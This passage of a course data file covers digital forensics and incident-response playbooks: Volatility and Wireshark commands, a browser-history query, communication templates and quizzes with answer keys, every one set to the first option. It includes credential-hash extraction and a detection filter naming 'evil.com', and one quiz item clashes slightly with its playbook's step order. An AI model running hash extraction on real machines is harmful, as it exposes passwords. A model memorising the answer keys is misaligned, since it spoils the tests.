          { question: 'What does `bitsadmin /transfer` do in an attack?', options: ['Downloads files using BITS - legitimate Windows service abused for malware delivery', 'Transfers BITS data between servers', 'Backs up system files', 'Transfers network configuration'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'BITSAdmin is a legitimate tool attackers use to download malware quietly.', certTags: ['Endpoint', 'Defense Evasion'] },
          { question: 'What does a process with "pink" highlighting mean in Process Explorer?', options: ['Packed executable - possibly obfuscated malware', 'High memory usage', 'Protected system process', 'Network-connected process'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'Process Explorer highlights packed executables in pink, indicating possible obfuscation.', certTags: ['Endpoint'] },
          { question: 'Why is net use \\\\DC01\\C$ suspicious?', options: ['Attempt to access admin share - lateral movement indicator', 'Normal file sharing', 'Backup operation', 'Print service'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Connecting to admin shares (C$, ADMIN$) is a common lateral movement technique.', certTags: ['Endpoint', 'Lateral Movement'] }
        ]
      }
    ]
  },


  {
    id: 'week42',
    title: 'Digital Forensics',
    durationText: 'Week 42 (Days 1-2)',
    focus: 'Perform memory forensics with Volatility, disk forensics, and network forensics with Wireshark',
    output: 'Ability to extract evidence from memory dumps, disk images, and PCAP files',
    topics: [
      {
        id: 'we42d01',
        title: 'Memory Forensics',
        description: 'Use Volatility framework to analyze memory dumps and extract forensic evidence',
        type: 'lab',
        duration: '4 hours',
        content: `:::objectives
- Use Volatility framework to analyze memory dumps
- Extract running processes, network connections, and credentials
- Identify malware indicators in memory
- Build a forensic timeline from memory artifacts
:::

### Volatility Framework

\`\`\`bash
# Identify memory image profile
volatility -f dump.raw imageinfo

# List running processes
volatility -f dump.raw --profile=Win10x64 pslist

# Find network connections
volatility -f dump.raw --profile=Win10x64 netscan

# Extract command lines
volatility -f dump.raw --profile=Win10x64 cmdline

# Dump credential hashes
volatility -f dump.raw --profile=Win10x64 hashdump

# Find injected code
volatility -f dump.raw --profile=Win10x64 malfind

# List DLLs loaded by a process
volatility -f dump.raw --profile=Win10x64 ldrmodules

# Extract files from memory
volatility -f dump.raw --profile=Win10x64 filescan
volatility -f dump.raw --profile=Win10x64 dumpfiles -Q 0x12345678 -D output/
\`\`\`

### Key Volatility Plugins

| Plugin | What It Finds |
|--------|---------------|
| pslist | All running processes |
| pstree | Process tree (parent-child) |
| netscan | Network connections and listeners |
| cmdline | Command-line arguments for processes |
| hashdump | NTLM password hashes |
| malfind | Injected code and suspicious memory |
| ldrmodules | Loaded DLLs - find hidden ones |
| filescan | Files in memory |
| dumpfiles | Extract files from memory |
| hivelist | Registry hives |
| userassist | User-assist entries (recently run programs) |
| shimcache | Application compatibility cache |

### Extracting Evidence

**Running Processes:**
\`\`\`
volatility -f dump.raw --profile=Win10x64 pslist | head -20

Offset(V)          Name                    PID   PPID
------------------ -------------------- ------ ------
0xffffe00123456780 System                    4      0
0xffffe00123458900 smss.exe                288      4
0xffffe00123460100 csrss.exe               376    288
0xffffe00123462300 wininit.exe             420    288
0xffffe00123468900 svchost.exe             612    420
0xffffe00123470100 suspicious.exe         1337   612
\`\`\`

**Network Connections:**
\`\`\`
volatility -f dump.raw --profile=Win10x64 netscan

Offset(V)         Proto  Local Address        Foreign Address      State        PID
----------------- ------ -------------------- -------------------- ---------- -----
0xffffe0012345678 TCP   192.168.1.100:49832  10.0.0.25:443        ESTABLISHED  1337
0xffffe00123458900 TCP   192.168.1.100:49833  10.0.0.25:8443       ESTABLISHED  1337
\`\`\`

### Malware Indicators in Memory

1. **Unusual process names** - random strings, misspellings (svchost vs scvhost)
2. **Processes not on disk** - running from memory only
3. **Injected code sections** - RWX memory with executable code
4. **Network connections from unexpected processes**
5. **Registry persistence entries** - Run keys, services

:::classwork
**Lab:** Analyze a provided memory dump with Volatility. Find: running processes, network connections, injected code, and credential hashes. Document all findings.
:::`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'What Volatility plugin would you use first when analyzing a memory dump, and why?',
        interviewAnswer: 'Start with `imageinfo` to identify the correct profile, then `pslist` to enumerate running processes. Processes reveal what was active at capture time. Then use `netscan` for network connections, `cmdline` for command-line arguments, and `malfind` for injected code.',
        quiz: [
          { question: 'Which Volatility plugin identifies the correct memory image profile?', options: ['imageinfo', 'pslist', 'netscan', 'hashdump'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'imageinfo determines the OS version and profile needed for other plugins.', certTags: ['Forensics'] },
          { question: 'What does the `pslist` plugin show?', options: ['All running processes with PID, PPID, and timestamps', 'Network connections', 'Registry hives', 'DLL loads'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'pslist enumerates all active processes in memory.', certTags: ['Forensics'] },
          { question: 'Which plugin finds injected code in processes?', options: ['malfind', 'pslist', 'netscan', 'filescan'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'malfind detects injected code by finding RWX memory sections with executable content.', certTags: ['Forensics'] },
          { question: 'What does `hashdump` extract from a memory dump?', options: ['NTLM password hashes from SAM database', 'File hashes', 'Network packet hashes', 'Registry key hashes'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'hashdump extracts NTLM hashes from the SAM database in memory.', certTags: ['Forensics', 'Credential Access'] },
          { question: 'Which plugin shows command-line arguments for processes?', options: ['cmdline', 'pslist', 'netscan', 'hivelist'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'cmdline shows the full command line used to start each process.', certTags: ['Forensics'] },
          { question: 'What does `netscan` find in a memory dump?', options: ['Active network connections and listening ports', 'DNS cache', 'Firewall rules', 'Browser history'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'netscan shows TCP/UDP connections and listening sockets at capture time.', certTags: ['Forensics', 'Network'] },
          { question: 'What does `malfind` detect that `pslist` does not?', options: ['Injected code sections with RWX permissions', 'Process creation order', 'Parent-child relationships', 'DLL loads'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'malfind specifically looks for suspicious memory sections that indicate code injection.', certTags: ['Forensics'] },
          { question: 'What does `filescan` and `dumpfiles` do together?', options: ['filescan finds files in memory; dumpfiles extracts them to disk', 'filescan deletes files; dumpfiles restores them', 'filescan hashes files; dumpfiles validates them', 'Same plugin'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'filescan locates file objects in memory, dumpfiles writes them to disk for analysis.', certTags: ['Forensics'] },
          { question: 'What is a suspicious indicator when reviewing `pslist` output?', options: ['Process running from unusual path or with random name', 'Multiple svchost.exe instances', 'System process with PID 4', 'Services.exe running services'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Legitimate processes run from known paths; suspicious ones run from Temp or have random names.', certTags: ['Forensics'] },
          { question: 'Which plugin finds registry hives in memory?', options: ['hivelist', 'pslist', 'netscan', 'hashdump'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'hivelist enumerates loaded registry hive files (SAM, SYSTEM, SOFTWARE).', certTags: ['Forensics'] },
          { question: 'What does `userassist` reveal about user activity?', options: ['Recently executed programs with run counts and timestamps', 'User passwords', 'User group memberships', 'User login history'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'userassist tracks programs executed via Windows Explorer with run counts and timestamps.', certTags: ['Forensics'] },
          { question: 'What does `ldrmodules` detect that pslist does not?', options: ['Hidden or unlinked DLLs - process hollowing indicator', 'Loaded executables', 'Process parent', 'Command line arguments'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'ldrmodules finds DLLs loaded in process memory but not in the PEB load order (hidden).', certTags: ['Forensics'] },
          { question: 'Why is the `--profile` flag required in Volatility commands?', options: ['Tells Volatility the OS version to correctly parse memory structures', 'Sets output format', 'Filters results by profile', 'Selects the target process'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Memory structures differ by OS version; the profile ensures correct parsing.', certTags: ['Forensics'] },
          { question: 'What does `shimcache` reveal?', options: ['Application compatibility cache - shows programs that were run', 'Software installation dates', 'Driver compatibility', 'Browser cache'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'shimcache stores entries for programs executed on the system, even if deleted.', certTags: ['Forensics'] },
          { question: 'What would you do after finding a suspicious process in pslist?', options: ['Check its cmdline, netscan connections, and run malfind for injected code', 'Delete it immediately', 'Ignore if PID is low', 'Only check if it has network connections'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Always cross-reference: command line, network connections, and injected code indicators.', certTags: ['Forensics'] }
        ]
      },
      {
        id: 'we42d02',
        title: 'Disk Forensics & Network Forensics',
        description: 'Analyze disk images, file systems, browser artifacts, and network PCAPs with Wireshark',
        type: 'lab',
        duration: '4 hours',
        content: `:::objectives
- Understand NTFS metadata and file system artifacts
- Extract browser history, cookies, and cache
- Analyze network PCAPs with Wireshark
- Reconstruct HTTP sessions from captured traffic
:::

### File System Analysis

**NTFS Key Artifacts:**

| Artifact | Location | Contains |
|----------|----------|----------|
| $MFT | Master File Table | All file metadata |
| $LogFile | Journal | Transaction log |
| $UsnJrnl | Change Journal | File change history |
| $I30 | Index entries | Directory listings |
| $SECURITY | Security descriptors | ACLs |

**File Carving:**
\`\`\`bash
# Scalpel — carve files from disk image
scalpel -o output/ disk_image.dd

# Autopsy — GUI-based forensic analysis
autopsy disk_image.dd
\`\`\`

### Browser Forensics

| Browser | History Location | Database |
|---------|-----------------|----------|
| Chrome | %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History | SQLite |
| Firefox | %APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default\\places.sqlite | SQLite |
| Edge | %LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\History | SQLite |

\`\`\`bash
# Extract Chrome history
sqlite3 History "SELECT url, title, visit_count, last_visit_time FROM urls;"
\`\`\`

### Network Forensics (Wireshark)

**Key Filters:**
\`\`\`
# HTTP traffic
http

# DNS queries
dns

# Suspicious IPs
ip.addr == 10.0.0.25

# TCP streams
tcp.stream eq 5

# HTTP POST (potential exfiltration)
http.request.method == "POST"

# DNS queries for specific domain
dns.qry.name contains "evil.com"
\`\`\`

### Reconstructing HTTP Sessions

1. **Follow TCP Stream:** Right-click packet -> Follow -> TCP Stream
2. **Extract files:** File -> Export Objects -> HTTP
3. **Analyze DNS:** Statistics -> DNS -> look up queries
4. **Check TLS:** Statistics -> TLS -> JA3 hashes

### PCAP Analysis Workflow

\`\`\`
1. Open PCAP in Wireshark
2. Check Statistics -> Capture File Properties (overview)
3. Statistics -> Protocol Hierarchy (what protocols exist)
4. Statistics -> Conversations (top talkers)
5. Statistics -> Endpoints (unique IPs)
6. Filter by suspicious IP
7. Follow TCP streams for full session
8. Export files of interest
\`\`\`

:::classwork
**Lab:** Given a PCAP file containing an attack: identify the attacker IP, find the HTTP requests, extract downloaded files, and reconstruct the full attack timeline.
:::`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'How would you reconstruct an attacker HTTP session from a PCAP file?',
        interviewAnswer: '1) Open PCAP in Wireshark. 2) Filter by attacker IP. 3) Right-click HTTP packet -> Follow -> TCP Stream to see full request/response. 4) File -> Export Objects -> HTTP to extract downloaded files. 5) Check DNS queries for C2 domains. 6) Build timeline of all HTTP requests with timestamps.',
        quiz: [
          { question: 'What does the $MFT contain in NTFS?', options: ['All file metadata - names, timestamps, sizes, permissions', 'File contents', 'Registry data', 'Network configuration'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: '$MFT (Master File Table) is the core NTFS metadata structure.', certTags: ['Forensics'] },
          { question: 'Which tool is used for file carving from disk images?', options: ['Scalpel or Autopsy', 'Wireshark', 'Volatility', 'Nmap'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Scalpel and Autopsy extract files from raw disk images.', certTags: ['Forensics'] },
          { question: 'Where is Chrome browser history stored?', options: ['%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History', '%APPDATA%\\Chrome\\history.dat', 'C:\\Windows\\Chrome\\History', 'Registry key HKLM\\Chrome\\History'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Chrome history is an SQLite database in the user profile.', certTags: ['Forensics'] },
          { question: 'What Wireshark filter shows HTTP POST requests?', options: ['http.request.method == "POST"', 'http.post', 'tcp.port == 80', 'http.request'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'This filter shows only HTTP POST requests, common in data exfiltration.', certTags: ['Network Forensics'] },
          { question: 'What does "Follow TCP Stream" in Wireshark show?', options: ['The full conversation between two endpoints in plaintext', 'Packet statistics', 'Protocol hierarchy', 'DNS queries'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Follow TCP Stream reconstructs the entire session payload.', certTags: ['Network Forensics'] },
          { question: 'What does the $UsnJrnl (Change Journal) record?', options: ['All file changes with reasons and timestamps', 'File contents', 'Registry changes', 'Network connections'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: '$UsnJrnl logs every file system change with a reason code.', certTags: ['Forensics'] },
          { question: 'How do you extract files from HTTP traffic in Wireshark?', options: ['File -> Export Objects -> HTTP', 'Right-click -> Extract File', 'Statistics -> Files', 'Edit -> Copy -> HTTP'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Wireshark can export all HTTP objects (files, images, scripts) from a capture.', certTags: ['Network Forensics'] },
          { question: 'What does "Statistics -> Conversations" show in Wireshark?', options: ['All source-destination pairs with packet and byte counts', 'Protocol breakdown', 'DNS queries', 'HTTP headers'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Conversations shows all communication pairs sorted by volume.', certTags: ['Network Forensics'] },
          { question: 'What is JA3 in the context of network forensics?', options: ['TLS client fingerprint that identifies the application', 'HTTP authentication method', 'DNS query type', 'File hash algorithm'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'JA3 hashes TLS Client Hello to fingerprint the client application.', certTags: ['Network Forensics'] },
          { question: 'Which Wireshark filter shows DNS queries for a specific domain?', options: ['dns.qry.name contains "evil.com"', 'dns == "evil.com"', 'query.evil.com', 'dns.host == evil.com'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'dns.qry.name filters DNS queries containing the specified domain.', certTags: ['Network Forensics'] },
          { question: 'What does the $LogFile (NTFS Journal) contain?', options: ['Transaction log for crash recovery and file system consistency', 'User login history', 'Application logs', 'Network traffic logs'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: '$LogFile records NTFS transactions for crash recovery.', certTags: ['Forensics'] },
          { question: 'How would you identify the top talkers in a PCAP?', options: ['Statistics -> Conversations -> sort by Bytes', 'Statistics -> Protocol Hierarchy', 'View -> Packet List', 'Edit -> Find Packet'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Conversations sorted by Bytes shows which endpoints generated the most traffic.', certTags: ['Network Forensics'] },
          { question: 'What SQLite command extracts Chrome browsing history?', options: ['SELECT url, title, visit_count FROM urls;', 'SELECT * FROM history;', 'DUMP TABLE urls;', 'GET history FROM urls;'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Chrome stores history in an SQLite database with the urls table.', certTags: ['Forensics'] },
          { question: 'What does "Export Objects -> HTTP" give you in Wireshark?', options: ['All files transferred via HTTP - HTML, images, executables', 'HTTP headers only', 'DNS queries', 'TCP handshakes'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'This exports all HTTP objects (files) from the capture for further analysis.', certTags: ['Network Forensics'] },
          { question: 'What should you check first when analyzing a suspicious PCAP?', options: ['Statistics -> Capture File Properties and Protocol Hierarchy', 'Individual packets', 'DNS only', 'HTTP only'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Start with overview statistics to understand the capture scope and protocol mix.', certTags: ['Network Forensics'] }
        ]
      }
    ]
  },


  {
    id: 'week43',
    title: 'Incident Response Playbooks',
    durationText: 'Week 43 (Days 1-2)',
    focus: 'Execute structured IR playbooks for ransomware, phishing, brute force, and recovery scenarios',
    output: 'Ability to follow IR playbooks, contain incidents, and produce post-incident reports',
    topics: [
      {
        id: 'we43d01',
        title: 'Ransomware & Phishing Playbooks',
        description: 'Execute IR playbooks for ransomware and phishing incidents with containment and eradication steps',
        type: 'learn',
        duration: '4 hours',
        content: `:::objectives
- Follow a structured ransomware IR playbook
- Execute phishing IR steps from identification to remediation
- Understand containment best practices (DO NOT turn off systems)
- Create communication templates for incident response
:::

### Ransomware IR Playbook

\`\`\`
1. IDENTIFY
   +-- Confirm ransomware (encryption indicators, ransom note)
   +-- Identify affected systems and scope
   +-- Check if backups exist and are clean

2. CONTAIN (DO NOT TURN OFF SYSTEMS)
   +-- Disconnect network cables (DO NOT shut down - may lose encryption keys)
   +-- Disable WiFi adapters
   +-- Isolate affected VLANs
   +-- Disable compromised accounts

3. PRESERVE
   +-- Memory dump of affected systems (before shutdown)
   +-- Copy ransom note
   +-- Preserve logs (SIEM, firewall, endpoint)
   +-- Screenshot of ransom note

4. ASSESS
   +-- Determine ransomware variant
   +-- Check if decryptor exists (nomoreransom.org)
   +-- Identify initial access vector
   +-- Assess data exfiltration (double extortion)

5. ERADICATE
   +-- Remove malware from all affected systems
   +-- Close initial access vector
   +-- Reset all compromised credentials
   +-- Patch exploited vulnerabilities

6. RECOVER
   +-- Restore from clean backups
   +-- Verify backup integrity
   +-- Rebuild systems if necessary
   +-- Monitor for re-infection

7. LESSONS
   +-- Post-incident review meeting
   +-- Update detection rules
   +-- Improve backup strategy
   +-- Update playbooks
\`\`\`

:::warning
NEVER turn off an affected system during ransomware. Memory may contain encryption keys needed for recovery. Always disconnect the network cable instead.
:::

### Phishing IR Playbook

\`\`\`
1. IDENTIFY
   +-- User reports suspicious email
   +-- Extract IOCs from email (sender, subject, URLs, attachments)

2. EXTRACT IOCs
   +-- Sender email address
   +-- Attachment hash (SHA256)
   +-- URLs in email body
   +-- Email headers (Received-SPF, DKIM results)

3. BLOCK
   +-- Add sender to email gateway blocklist
   +-- Block URLs at proxy/firewall
   +-- Submit hash to sandbox for analysis
   +-- Block file hash on endpoints

4. NOTIFY
   +-- Alert affected users
   +-- Send phishing warning to organization
   +-- Notify SOC team

5. SCAN
   +-- Search email gateway for similar messages
   +-- Search endpoints for dropped files
   +-- Search DNS logs for C2 domains
   +-- Check if any user clicked/opened attachment

6. REMEDIATE
   +-- Delete malicious emails from all mailboxes
   +-- Reset credentials for affected users
   +-- Update email filtering rules
   +-- Add new IOCs to detection rules
\`\`\`

### Communication Templates

**Internal Notification:**
\`\`\`
Subject: [SECURITY] Phishing Campaign Detected - Action Required

Team,
A phishing campaign targeting our organization has been identified.

IOC Summary:
- Sender: spoofed@company.com
- Subject: "Urgent: Invoice #48291"
- Attachment: Invoice_48291.pdf.exe

Actions Required:
1. Do NOT open any emails matching this description
2. Report any suspicious emails to security@company.com
3. If you already opened the attachment, contact IT immediately

Security Team
\`\`\`

:::classwork
**Lab:** Walk through a ransomware IR scenario:
1. "Ransomware detected on WORKSTATION-05"
2. Follow the playbook steps: Identify, Contain, Preserve, Assess
3. Document all actions taken
4. Create an internal notification
:::`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'Why should you never turn off a computer during a ransomware incident?',
        interviewAnswer: 'Memory may contain encryption keys needed for recovery. Some ransomware variants store keys only in memory, and shutting down loses them permanently. Always disconnect the network cable instead to contain the spread while preserving forensic evidence.',
        quiz: [
          { question: 'What is the FIRST step when ransomware is detected?', options: ['Disconnect network cables - DO NOT turn off the system', 'Turn off the computer', 'Pay the ransom', 'Format the hard drive'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Always disconnect network to contain spread while preserving memory for potential recovery.', certTags: ['Incident Response'] },
          { question: 'Why preserve memory dumps before system shutdown?', options: ['Encryption keys may exist only in memory for recovery', 'To speed up restoration', 'To save disk space', 'Required by law'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Some ransomware stores decryption keys in memory; losing them makes recovery impossible.', certTags: ['Incident Response'] },
          { question: 'What is the first step in a phishing IR playbook?', options: ['Identify - confirm the phishing email and extract IOCs', 'Block the sender', 'Reset user passwords', 'Send organization-wide alert'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'First understand what you are dealing with before taking action.', certTags: ['Incident Response'] },
          { question: 'What IOCs do you extract from a phishing email?', options: ['Sender address, attachment hash, URLs, email headers', 'Only the sender address', 'Only the attachment', 'Only the subject line'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Full IOC extraction enables comprehensive blocking across all defenses.', certTags: ['Incident Response'] },
          { question: 'What does "double extortion" mean in ransomware?', options: ['Attackers encrypt data AND threaten to publish stolen data', 'Attackers demand two payments', 'Two ransomware variants are used', 'Both email and network are compromised'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Double extortion: encrypt for recovery ransom + exfiltrate for leak threat.', certTags: ['Incident Response'] },
          { question: 'Where do you check if a free decryptor exists?', options: ['nomoreransom.org', 'Microsoft.com', 'VirusTotal.com', 'FBI.gov'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'The No More Ransom project provides free decryptors for many ransomware variants.', certTags: ['Incident Response'] },
          { question: 'What should you do after containing a phishing incident?', options: ['Scan for similar emails, check for dropped files, block IOCs', 'Wait 24 hours', 'Only reset passwords', 'Nothing - incident is contained'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'After containment, scan for scope and remediate all affected systems.', certTags: ['Incident Response'] },
          { question: 'Why send a phishing warning notification to the organization?', options: ['Prevent additional users from falling for the same campaign', 'Satisfy compliance', 'Speed up investigation', 'Notify law enforcement'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Warning users prevents additional infections and reduces the attack window.', certTags: ['Incident Response'] },
          { question: 'What is the final step in a ransomware IR playbook?', options: ['Lessons learned - post-incident review and improvement', 'Pay the ransom', 'Shut down all systems', 'Delete all logs'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Post-incident review improves future response and prevents recurrence.', certTags: ['Incident Response'] },
          { question: 'What does "containment" achieve vs "eradication"?', options: ['Containment limits spread; eradication removes the threat entirely', 'Same thing', 'Containment is faster', 'Eradication happens first'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Containment stops the bleeding; eradication removes the disease.', certTags: ['Incident Response'] },
          { question: 'What should the initial internal phishing notification include?', options: ['IOCs, affected systems, required user actions, contact info', 'Just the sender address', 'Full technical analysis', 'Nothing until investigation completes'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Provide enough info for users to identify and report matching emails.', certTags: ['Incident Response'] },
          { question: 'What actions should affected users take after clicking a phishing link?', options: ['Disconnect from network, contact IT immediately, do not enter credentials', 'Continue working', 'Reboot the computer', 'Forward the email to colleagues'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Immediate disconnection limits damage; credential entry must be stopped.', certTags: ['Incident Response'] },
          { question: 'Why verify backup integrity before recovery?', options: ['Backups may also be encrypted or compromised by the attacker', 'Backups are always safe', 'To save time', 'Compliance requirement only'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'Attackers often target backups. Verify they are clean before restoring.', certTags: ['Incident Response'] },
          { question: 'What is "lateral movement" in the context of ransomware?', options: ['Ransomware spreading from the initial host to other systems on the network', 'User moving between workstations', 'Data moving to the cloud', 'Backup files being transferred'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Lateral movement is the attacker moving between systems to maximize encryption scope.', certTags: ['Incident Response'] },
          { question: 'What is the purpose of a post-incident review meeting?', options: ['Identify what went well, what failed, and how to improve future response', 'Blame individuals for the incident', 'Justify paying the ransom', 'Close the ticket'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Post-incident reviews are blameless and focus on process improvement.', certTags: ['Incident Response'] }
        ]
      },
      {
        id: 'we43d02',
        title: 'Brute Force & Recovery Playbooks',
        description: 'Execute brute force IR, recovery checklists, and create post-incident reports',
        type: 'lab',
        duration: '4 hours',
        content: `:::objectives
- Execute a brute force IR playbook from identification to recovery
- Follow recovery checklists for system restoration
- Write a post-incident report template
- Practice IR communication and documentation
:::

### Brute Force IR Playbook

\`\`\`
1. IDENTIFY
   +-- Confirm brute force (multiple failed logons from same source)
   +-- Identify target accounts
   +-- Check if any account was successfully compromised

2. BLOCK SOURCE
   +-- Block attacker IP at firewall
   +-- Add IP to threat intel watchlist
   +-- Check if source IP is VPN/proxy (may need broader blocking)

3. CHECK FOR COMPROMISE
   +-- Review successful logons (Event 4624) from attacker IP
   +-- Check for new accounts created (Event 4720)
   +-- Check for privilege changes (Event 4732)
   +-- Review process creation (Event 4688) during compromise window
   +-- Check for persistence mechanisms

4. RESET CREDENTIALS
   +-- Force password reset for targeted accounts
   +-- Reset service account passwords
   +-- Review password policy compliance
   +-- Enable MFA if not already active

5. MONITOR
   +-- Set up watchlist for attacker IP
   +-- Monitor targeted accounts for unusual activity
   +-- Alert on repeated brute force patterns
\`\`\`

### Recovery Checklist

\`\`\`
SYSTEM RECOVERY:
[ ] Verify backup integrity and cleanliness
[ ] Restore from last known clean backup
[ ] Patch all systems to latest updates
[ ] Reset all local administrator passwords
[ ] Verify system time (NTP sync)
[ ] Reinstall OS if compromise confirmed

ACCOUNT RECOVERY:
[ ] Reset all compromised account passwords
[ ] Review and remove unauthorized account changes
[ ] Verify group memberships
[ ] Enable MFA for all privileged accounts
[ ] Review service account credentials

NETWORK RECOVERY:
[ ] Verify firewall rules are correct
[ ] Review DNS settings
[ ] Check proxy configurations
[ ] Verify VPN access controls
[ ] Monitor network traffic for anomalies

APPLICATION RECOVERY:
[ ] Verify application integrity
[ ] Restore from clean backups
[ ] Test application functionality
[ ] Review application logs for anomalies
[ ] Update application credentials
\`\`\`

### Post-Incident Report Template

\`\`\`
INCIDENT REPORT

1. EXECUTIVE SUMMARY
   - Date/Time of incident
   - Duration
   - Impact summary
   - Resolution status

2. TIMELINE
   | Time | Event | Source |
   |------|-------|--------|
   | HH:MM | Initial detection | SIEM |
   | HH:MM | Containment action | Analyst |
   | HH:MM | Eradication complete | Analyst |
   | HH:MM | Systems restored | IT |

3. ROOT CAUSE ANALYSIS
   - How did the attacker gain access?
   - What vulnerability was exploited?
   - What controls failed?

4. IMPACT ASSESSMENT
   - Systems affected
   - Data compromised
   - Business impact
   - Financial impact

5. RESPONSE ACTIONS
   - Containment steps taken
   - Eradication steps taken
   - Recovery steps taken

6. LESSONS LEARNED
   - What went well
   - What needs improvement
   - Action items with owners and deadlines

7. APPENDIX
   - IOCs identified
   - Affected system list
   - Communication logs
\`\`\`

:::classwork
**Lab:** Execute a brute force IR scenario:
1. Alert: 500+ failed logons from 10.0.0.50 targeting admin accounts
2. Follow the playbook: identify, block, check compromise, reset credentials
3. Write a post-incident report using the template
:::`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'After blocking an attacker IP from a brute force attack, what else should you check before closing the ticket?',
        interviewAnswer: 'Check if any login succeeded from the attacker IP (Event 4624). If yes: check for new accounts created, privilege changes, process execution, persistence mechanisms, and lateral movement. Reset credentials for all targeted accounts. Set up monitoring for the attacker IP. Document everything.',
        quiz: [
          { question: 'What is the first step after confirming a brute force attack?', options: ['Block attacker IP at firewall', 'Reset all passwords', 'Shut down the server', 'Notify the attacker'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Block the source IP immediately to stop the attack.', certTags: ['Incident Response'] },
          { question: 'What should you check after blocking a brute force source?', options: ['If any login succeeded - check for compromise indicators', 'Nothing - blocking stops the attack', 'Only reset passwords', 'Wait for next alert'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Blocking stops ongoing attacks but you must check if any succeeded.', certTags: ['Incident Response'] },
          { question: 'What Event ID indicates a successful logon from the attacker?', options: ['Event 4624', 'Event 4625', 'Event 4720', 'Event 1102'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Event 4624 indicates successful logon - if the attacker succeeded.', certTags: ['Incident Response', 'Windows'] },
          { question: 'What is the purpose of a recovery checklist?', options: ['Ensure all recovery steps are completed systematically', 'Document the incident', 'Satisfy compliance', 'Notify management'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Checklists prevent missed steps during high-stress recovery operations.', certTags: ['Incident Response'] },
          { question: 'What should a post-incident report include?', options: ['Timeline, root cause, impact, actions, lessons learned', 'Just the IOCs', 'Only management summary', 'Blame assignment'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Complete reports enable learning and future improvement.', certTags: ['Incident Response'] },
          { question: 'Why verify backup cleanliness before restoring?', options: ['Backups may be encrypted or compromised by the attacker', 'Backups are always safe', 'To save time', 'Only needed for compliance'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Attackers often target backups first.', certTags: ['Incident Response'] },
          { question: 'What does "containment" mean in incident response?', options: ['Limiting the spread of the attack to other systems', 'Removing the attacker completely', 'Restoring systems to normal', 'Documenting the incident'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Containment stops the bleeding while eradication removes the threat.', certTags: ['Incident Response'] },
          { question: 'Why enable MFA after a brute force incident?', options: ['Prevents password-only attacks even if credentials are compromised', 'Slows down attackers', 'Required by PCI-DSS only', 'MFA is optional'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'MFA prevents credential-based attacks even when passwords are leaked.', certTags: ['Incident Response'] },
          { question: 'What is the correct order: Identify, Block, Check, Reset?', options: ['Yes - identify first, then block, check for compromise, then reset', 'No - reset first, then block', 'No - check first, then identify', 'No - block first, then identify'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'The correct sequence ensures you understand the attack before taking action.', certTags: ['Incident Response'] },
